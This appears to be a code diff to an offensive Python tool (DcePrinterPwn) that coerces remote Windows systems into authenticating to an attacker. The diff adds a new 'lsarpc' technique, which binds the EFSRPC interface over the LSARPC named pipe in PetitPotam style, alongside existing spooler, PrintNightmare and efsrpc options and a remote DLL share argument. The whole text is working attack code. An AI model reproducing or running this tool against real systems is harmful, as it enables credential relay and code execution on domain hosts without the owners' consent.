@@ -174,6 +174,35 @@ class DcePrinterPwn:
 
 		return True
 
+	def connect_lsa(self):
+		assert self.rhost is not None and self.rport is not None
+		assert self.domain is not None and self.user is not None
+		assert self.passwd is not None
+
+		bindStr = f"ncacn_np:{self.rhost}[\\PIPE\\lsarpc]"
+		rpcTrans = transport.DCERPCTransportFactory(bindStr)
+
+		rpcTrans.set_dport(self.rport)
+
+		if hasattr(rpcTrans, 'set_credentials'):
+			rpcTrans.set_credentials(self.user, self.passwd, self.domain, self.nthash, self.lmhash)
+
+		self._dce = rpcTrans.get_dce_rpc()
+
+		try:
+			self._dce.connect()
+		except Exception as e:
+			return False
+
+		try:
+			# LSARPC named pipe
+			MSRPC_UUID_EFSR = uuidtup_to_bin(('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0'))
+			self._dce.bind(MSRPC_UUID_EFSR)
+		except Exception as e:
+			return False
+
+		return True
+
 	def call_efs_open_file_raw(self):
 		assert self._dce is not None and self.lhost is not None
 
@@ -316,7 +345,7 @@ def generate_targets(target):
 
 def main():
 	parser = argparse.ArgumentParser(add_help=True, description='Coerce remote systems to authenticate', formatter_class=argparse.RawDescriptionHelpFormatter)
-	parser.add_argument('technique', action='store', help='attack technique to execute', choices=['spooler', 'nightmare', 'efsrpc'])
+	parser.add_argument('technique', action='store', help='attack technique to execute', choices=['spooler', 'nightmare', 'lsarpc', 'efsrpc'])
 	parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
 	parser.add_argument('--share', action='store', required=False, default=None, help='path to DLL (ex: \'\\\\10.1.10.199\\share\\Program.dll\')')
 	parser.add_argument('--lhost', action='store', required=False, default=None, help='listening hostname or IP')
@@ -459,7 +488,10 @@ def main():
 				dce.nthash = nthash
 				dce.lmhash = lmhash
 
-				response = dce.connect_efs()
+				if args.technique == 'lsarpc':
+					response = dce.connect_lsa()
+				else:
+					response = dce.connect_efs()
 
 				# Go to next target if connection failed
 				if response is False:
